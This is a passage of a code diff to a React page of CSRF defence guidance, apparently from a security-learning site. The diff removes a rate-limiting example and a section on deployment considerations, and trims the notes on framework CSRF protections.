-
-function isRateLimited(origin) {
-  const now = Date.now();
-  const windowMs = 60000; // 1 minute
-  const maxRequests = 100;
-  
-  if (!originRequests.has(origin)) {
-    originRequests.set(origin, []);
-  }
-  
-  const requests = originRequests.get(origin);
-  const recentRequests = requests.filter(timestamp => now - timestamp < windowMs);
-  
-  if (recentRequests.length >= maxRequests) {
-    return true;
-  }
-  
-  recentRequests.push(now);
-  originRequests.set(origin, recentRequests);
-  return false;
-}`}
-                      />
-                    </div>
-                  </TabsContent>
-                </Tabs>
+app.use('/api/sensitive/', validateOrigin);`}
+                />
               </div>
             </div>
             
@@ -1495,9 +908,9 @@ function isRateLimited(origin) {
                   <div>
                     <h7 className="font-medium text-sm mb-1">Backend Frameworks:</h7>
                     <ul className="list-disc pl-6 space-y-1 text-xs">
-                      <li><strong>Django:</strong> Built-in CSRF middleware with {% csrf_token %} template tag</li>
+                      <li><strong>Django:</strong> Built-in CSRF middleware with csrf_token template tag</li>
                       <li><strong>Ruby on Rails:</strong> protect_from_forgery method with authenticity tokens</li>
-                      <li><strong>ASP.NET Core:</strong> Anti-forgery tokens with [ValidateAntiForgeryToken]</li>
+                      <li><strong>ASP.NET Core:</strong> Anti-forgery tokens with ValidateAntiForgeryToken</li>
                       <li><strong>Spring Security:</strong> CSRF protection enabled by default in newer versions</li>
                       <li><strong>Laravel:</strong> @csrf Blade directive and automatic validation</li>
                     </ul>
@@ -1542,48 +955,6 @@ function isRateLimited(origin) {
                 <li><strong>CSRF PoC Generator:</strong> Automated HTML form generation tools</li>
                 <li><strong>HackBar:</strong> Browser extension for security testing</li>
                 <li><strong>Custom Scripts:</strong> Python, JavaScript automation for testing</li>
-              </ul>
-            </div>
-          </div>
-        </div>
-
-        {/* Environment-Specific Considerations */}
-        <div>
-          <h4 className="text-xl font-semibold mb-4">Environment and Technology Considerations</h4>
-          <div className="space-y-4">
-            <div className="p-4 bg-cybr-muted/50 rounded-md">
-              <h5 className="font-semibold mb-2">Technology Stack Considerations</h5>
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                <div>
-                  <h6 className="font-medium text-sm mb-2">Single Page Applications (SPAs):</h6>
-                  <ul className="list-disc pl-6 space-y-1 text-xs">
-                    <li>Rely heavily on AJAX requests, requiring token-based protection</li>
-                    <li>Need token refresh mechanisms for long-running sessions</li>
-                    <li>Should implement proper logout and session invalidation</li>
-                    <li>Consider using JWT with proper CSRF protection</li>
-                  </ul>
-                </div>
-                <div>
-                  <h6 className="font-medium text-sm mb-2">API-First Applications:</h6>
-                  <ul className="list-disc pl-6 space-y-1 text-xs">
-                    <li>Should not rely solely on cookies for authentication</li>
-                    <li>Implement proper CORS policies</li>
-                    <li>Use stateless authentication when possible</li>
-                    <li>Validate Content-Type headers strictly</li>
-                  </ul>
-                </div>
-              </div>
-            </div>
-            
-            <div className="p-4 bg-cybr-muted/50 rounded-md">
-              <h5 className="font-semibold mb-2">Deployment Environment Impact</h5>
-              <ul className="list-disc pl-6 space-y-2 text-sm">
-                <li><strong>Load Balancers:</strong> Ensure session affinity or shared session storage for token validation</li>
-                <li><strong>CDN Integration:</strong> Configure proper cache headers and origin validation</li>
-                <li><strong>Microservices:</strong> Implement consistent CSRF protection across all services</li>
-                <li><strong>Container Environments:</strong> Manage secrets and tokens securely across containers</li>
-                <li><strong>Cloud Platforms:</strong> Leverage platform-specific security features and WAF rules</li>
-                <li><strong>Mobile Applications:</strong> Consider token-based authentication over cookie-based for mobile APIs</li>
               </ul>
             </div>
           </div>
